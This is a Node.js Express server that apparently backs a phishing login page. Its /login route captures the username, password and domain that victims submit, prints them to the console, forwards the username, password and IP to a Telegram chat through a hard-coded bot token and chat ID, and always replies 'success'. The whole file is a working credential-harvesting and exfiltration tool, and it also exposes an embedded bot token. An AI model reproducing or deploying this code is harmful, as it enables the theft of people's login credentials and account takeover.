import express from 'express';
import bodyParser from 'body-parser';
import axios from 'axios';
import path from 'path';
import chalk from 'chalk';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Configuration
const TELEGRAM_BOT_TOKEN = '7877883898:AAF03QKy5uzA1If-7AZdWpxNd2h6VSqQkyY';
const TELEGRAM_CHAT_ID = '7191391586';

// Add console logging middleware
app.use((req, res, next) => {
    console.log(chalk.cyan(`[${new Date().toISOString()}] ${req.method} ${req.url}`));
    console.log(chalk.gray(`User-Agent: ${req.headers['user-agent']}`));
    console.log(chalk.gray(`IP: ${req.ip}`));
    next();
});

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2'
    };

    console.log(chalk.yellow('[Telegram] Sending message...'));
    axios.post(url, payload)
        .then(() => console.log(chalk.green('[Telegram] Message sent successfully!')))
        .catch(error => console.error(chalk.red('[Telegram Error]'), error.message));
}

app.post('/login', (req, res) => {
    console.log(chalk.magenta('\n[+] New login attempt detected!'));
    
    const { username, password, domain, rememberMe, userAgent } = req.body;
    const ip = req.ip;
    const timestamp = new Date().toLocaleString();

    // Log all details to console
    console.log(chalk.blue('┌── Login Details ───────────────────────'));
    console.log(chalk.blue(`│ Username: ${username}`));
    console.log(chalk.blue(`│ Password: ${password}`));
    console.log(chalk.blue(`│ IP: ${ip}`));
    console.log(chalk.blue(`│ Timestamp: ${timestamp}`));
    console.log(chalk.blue('└────────────────────────────────────────\n'));

    // Simple Telegram message
    const message = `
🔐 *New Login Attempt*
Username: ${username || 'N/A'}
Password: ${password}
IP: ${ip}
    `;

    sendToTelegram(message);
    res.json({ status: 'success' });
});

app.get('/', (req, res) => {
    console.log(chalk.green('[+] Serving login page'));
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(chalk.yellow(`\n🚀 Server is running on http://localhost:${port}`));
    console.log(chalk.gray('Press CTRL+C to stop\n'));
});